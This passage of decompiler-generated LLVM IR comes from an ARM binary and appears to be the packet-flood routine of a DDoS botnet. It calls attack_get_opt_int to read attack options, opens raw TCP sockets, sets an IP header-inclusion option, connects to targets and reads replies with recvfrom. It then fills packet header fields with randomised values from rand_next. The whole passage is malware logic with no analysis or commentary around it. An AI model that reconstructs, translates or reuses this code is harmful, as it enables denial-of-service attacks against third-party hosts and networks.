  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, 65280
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v5_b738 = call i32 @llvm.bswap.i32(i32 %v0_b71c)
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v1_b788 = and i32 %v3_b77c, 65280
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v5_b7a0 = call i32 @llvm.bswap.i32(i32 %v3_b77c)
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v5_b7c4 = call i32 @llvm.bswap.i32(i32 %v3_b7a8)
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* @r0, align 4
  %v0_b7e0 = call i32 @malloc()
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v0_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
